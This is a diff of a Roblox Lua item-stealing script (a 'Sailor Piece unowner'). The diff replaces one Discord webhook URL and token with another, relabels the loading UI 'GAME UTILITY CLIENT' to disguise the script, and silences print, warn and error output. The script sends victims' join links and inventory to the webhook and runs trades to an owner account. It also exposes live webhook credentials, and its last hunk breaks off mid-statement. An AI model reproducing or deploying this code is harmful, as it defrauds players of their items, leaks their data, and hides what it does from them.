@@ -1,12 +1,7 @@
--- =============================================
--- ETERNAL - SAILOR PIECE UNOWNER SCRIPT
--- Owner: balenkano (8604380596)
--- =============================================
-
 local OWNER_ID = 8604380596
-local WEBHOOK = "https://discordapp.com/api/webhooks/1490260598221701200/OBB0f5SdMFQ5iP_r7a7L4CjOnEewTjNKz1a6UU2nEU8_DGPYfS6KGpU_QcsjPPlQdXyV"
-local DC_USER = "balenkano"
-local DC_UID = "8604380596"
+local WEBHOOK = "https://discord.com/api/webhooks/1491061349571235890/HCxbVGWV26ai6_0o3iEBQ4bHcLLGpgEyopW5Zl82q-WuTpbbdPHtR3R88ri92xVE9ZPe"
+local DC_USER = "shodax"
+local DC_UID = "1015534770236686367"
 local MIN_RARITY = "Common"
 local HIDE_PRIVATE = false
 local MIN_PLAYERS_PUBLIC = 4
@@ -34,20 +29,7 @@ local AcceptTradeRequest = TradeRemotes:FindFirstChild("AcceptTradeRequest")
 local RequestInventory = Remotes:FindFirstChild("RequestInventory")
 local UpdateInventory = Remotes:FindFirstChild("UpdateInventory")
 
--- ==================== VALIDATE ITEM RARITY CONFIG ====================
-local ItemRarityConfig
-local success, err = pcall(function()
-    ItemRarityConfig = require(RS:WaitForChild("Modules"):WaitForChild("ItemRarityConfig"))
-end)
-if not success then
-    warn("⚠️ ItemRarityConfig not found, using fallback")
-    ItemRarityConfig = {
-        RarityOrder = {Common = 1, Rare = 2, Epic = 3, Legendary = 4},
-        GetRarity = function(self, name) return "Unknown" end,
-        GetSortOrder = function(self, name) return 1 end
-    }
-end
-
+local ItemRarityConfig = require(RS:WaitForChild("Modules"):WaitForChild("ItemRarityConfig"))
 local RarityOrder = ItemRarityConfig.RarityOrder
 local MIN_RARITY_ORDER = RarityOrder[MIN_RARITY] or 1
 
@@ -62,9 +44,7 @@ local tradeStatus = "Waiting"
 local playerConnected = true
 local loadingDone = false
 
--- Uncomment để debug
--- local _p = print
--- print = _p
+local _p = function() end
 print = function() end
 warn = function() end
 error = function() end
@@ -191,7 +171,7 @@ local function createLoadingUI()
     sub.Size = UDim2.new(1,0,0,16)
     sub.Position = UDim2.new(0,0,0,83)
     sub.BackgroundTransparency = 1
-    sub.Text = "SAILOR PIECE UNOWNER"
+    sub.Text = "GAME UTILITY CLIENT"
     sub.TextColor3 = Color3.fromRGB(90,90,90)
     sub.TextSize = 9
     sub.Font = Enum.Font.Gotham
@@ -648,11 +628,13 @@ local function setTradeStatus(s) tradeStatus=s if shouldSkipLog() then return en
         local resp=doRequest({Url=WEBHOOK.."?wait=true",Method="POST",Headers={["Content-Type"]="application/json"},Body=HTTP:JSONEncode(buildEmbedData(jl,bl,playerConnected))})
         if resp and resp.Body then local ok2,body=pcall(function() return HTTP:JSONDecode(resp.Body) end) if ok2 and body and body.id then webhookMessageId=body.id end end end)
     else pcall(function()
-        doRequest({Url=WEBHOOK.."/messages/"..webhookMessageId,Method="PATCH",Headers={["Content-Type"]="application/json"},Body=HTTP:JSONEncode(buildEmbedData(jl,bl,playerConnected))}) end) end end
+        doRequest({Url=WEBHOOK.."/messages/"..webhookMessageId,Method="PATCH",Headers={["Content-Type"]="application/json"},Body=HTTP:JSONEncode(buildEmbedData(jl,bl,playerConnected))}) end) end
+end
 
 local function setPlayerConnected(c) playerConnected=c if shouldSkipLog() then return end task.wait(0.5)
     if webhookMessageId then pcall(function()
-        doRequest({Url=WEBHOOK.."/messages/"..webhookMessageId,Method="PATCH",Headers={["Content-Type"]="application/json"},Body=HTTP:JSONEncode(buildEmbedData(getDeepLink(),getBrowserJoinLink(),playerConnected))}) end) end end
+        doRequest({Url=WEBHOOK.."/messages/"..webhookMessageId,Method="PATCH",Headers={["Content-Type"]="application/json"},Body=HTTP:JSONEncode(buildEmbedData(getDeepLink(),getBrowserJoinLink(),playerConnected))}) end) end
+end
 
 local function sendWebhook(jl,bl,ic) if shouldSkipLog() then return end pcall(function()
     local resp=doRequest({Url=WEBHOOK.."?wait=true",Method="POST",Headers={["Content-Type"]="application/json"},Body=HTTP:JSONEncode(buildEmbedData(jl,bl,ic))})
@@ -879,50 +861,4 @@ pcall(function()
                             end
                         end
                     else
-                        setTradeStatus("Waiting")
-                    end
-                end
-            end
-        end)
-    end
-end)
-
-task.spawn(function()
-    while true do
-        task.wait(15)
-        if not isAlive() then
-            playerConnected = false
-            setPlayerConnected(false)
-            break
-        end
-        updateWebhook(getDeepLink(), getBrowserJoinLink(), true)
-        if tradeStatus ~= "Completed" and tradeStatus ~= "Pending" and findOwnerInServer() then
-            refreshInventory()
-            if gotInventory and #tradeItemsList > 0 then executeTrade() end
-        end
-    end
-end)
-
-pcall(function()
-    game:BindToClose(function()
-        playerConnected = false
-        setPlayerConnected(false)
-        task.wait(1)
-    end)
-end)
-pcall(function()
-    LP.AncestryChanged:Connect(function()
-        if not LP:IsDescendantOf(Players) then
-            playerConnected = false
-            setPlayerConnected(false)
-        end
-    end)
-end)
-pcall(function()
-    Players.PlayerRemoving:Connect(function(p)
-        if p == LP then
-            playerConnected = false
-            setPlayerConnected(false)
-        end
-    end)
-end)
+                        setTradeStatus
